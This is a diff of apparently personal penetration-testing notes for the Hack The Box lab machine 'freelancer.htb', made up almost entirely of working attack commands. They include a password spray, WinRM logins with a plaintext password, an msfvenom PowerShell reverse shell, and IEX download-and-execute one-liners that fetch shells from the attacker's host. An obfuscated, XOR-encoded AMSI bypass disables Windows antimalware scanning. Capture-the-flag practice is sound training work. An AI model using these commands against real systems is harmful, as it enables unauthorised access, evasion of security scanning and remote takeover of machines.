@@ -125,7 +125,14 @@ sudo ntpdate freelancer.htb
 //kerbrute passwordspray --dc 10.10.11.5 -d freelancer.htb ~/users.txt 'PWN3D#l0rr@Armessa199'
 
 nxc ldap 10.10.11.5 -d freelancer.htb -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -M whoami
-nxc winrm 10.10.11.5 -d freelancer.htb -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -X 'IEX(IWR http://10.10.14.185:8000/shells/shell_wstderr.ps1 -UseBasicParsing)'
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.52 LPORT=8000 -f ps1 > new_shell.ps1
+nxc winrm 10.129.91.242 -d freelancer.htb -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -X 'IEX(IWR http://10.10.14.52:8000/new_shell.ps1 -UseBasicParsing)'
+
+==========(21)======================================================================================================================
+
+
+
+
 :\> [Ref]."A`ss`Embly"."GET`TY`Pe"($(('76 5c 56 51 40 48 0b 68 44 4b 44 42 40 48 40 4b 51 0b 64 50 51 4a 48 44 51 4c 4a 4b 0b 64 48 56 4c 70 51 4c 49 56'.Split(' ')|ForEach{[char](([convert]::ToInt16($_, 16)-bxor 0x25))})-join '')).GetField($(('44 48 56 4c 6c 4b 4c 51 63 44 4c 49 40 41'.Split(' ')|ForEach{[char](([convert]::ToInt16($_, 16)-bxor 0x25))})-join ''),$('NonPublic,Static')).SetValue($null,$true)
 C:\> IEX(IWR http://10.10.14.185:8000/NETAMSI.ps1 -UseBasicParsing)
 C:\> IEX(IWR http://10.10.14.185:8000/ConPtyReflect.ps1 -UseBasicParsing)
